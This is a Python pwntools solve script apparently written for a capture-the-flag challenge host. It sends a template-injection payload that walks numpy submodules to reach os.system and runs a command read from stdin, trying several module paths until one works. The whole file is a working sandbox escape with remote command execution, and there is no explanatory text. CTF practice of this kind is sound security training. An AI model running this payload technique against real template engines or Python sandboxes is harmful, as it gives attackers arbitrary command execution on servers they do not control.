from pwn import *

HOST = "challenges.1pc.tf"
PORT = 45130

paths = [
    "numpy.typing.sys",
    "numpy.f2py.sys",
    "numpy.testing.sys",
    "numpy.char.sys"
]

for p in paths:
    r = remote(HOST, PORT)
    r.recvuntil(b">>> ")

    payload = "{% for k in dict(os=1) %}{% set x=" + p + ".modules[k].system(" + p + ".stdin.readline()) %}{% endfor %}"
    r.send(payload.encode() + b"\n")
    r.send(b"/fix help\n")

    out = r.recvall(timeout=3).decode(errors="ignore").strip()
    r.close()

    if out and out != "Nope":
        print(out)
        break